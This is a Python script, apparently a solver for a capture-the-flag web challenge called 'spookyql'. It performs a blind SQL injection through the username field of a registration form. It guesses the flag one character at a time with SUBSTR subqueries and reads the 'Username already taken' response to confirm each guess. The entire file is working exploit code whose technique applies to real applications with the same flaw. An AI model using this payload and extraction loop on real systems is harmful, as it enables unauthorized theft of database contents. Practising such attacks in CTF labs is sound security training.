import requests

# url = 'https://usc-spookyql.chals.io/965ec6f4-5d42-4758-a65d-6fdd96e662b6/'
url = 'http://127.0.0.1:5000/'

# data = {"username": "bian' || (SELECT 'tr' WHERE SUBSTR((SELECT flag FROM flags),1,1)='R') || 'ue",
# 		"password": "abc"
# 		}
# data_login = {"username": "bian","password": "bian123"}
# # data2 = f"6-8pm'AND SUBSTR((SELECT*FROM FLAG),{index},1)='{fuzz}"


def regis(data):
	response = requests.post(url+'register', data)
	return response.text

def log():
	response = requests.post(url+'login', data_login)
	print(response.text)

# a = regis(data)
# print(a)
# log()

fuzz = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890{}_'
flag = ''
for i in range(1,30):
	for a in fuzz:
		print(i)
		data = {
		    "username": f"bian' || (SELECT 'tr' WHERE SUBSTR((SELECT flag FROM flags),{i},1)='{a}') || 'tue{i}",
	   		 "password": "abc"
				}
		out = regis(data)
		if 'Username already taken' not in out:
			flag += a
			print(flag)
			break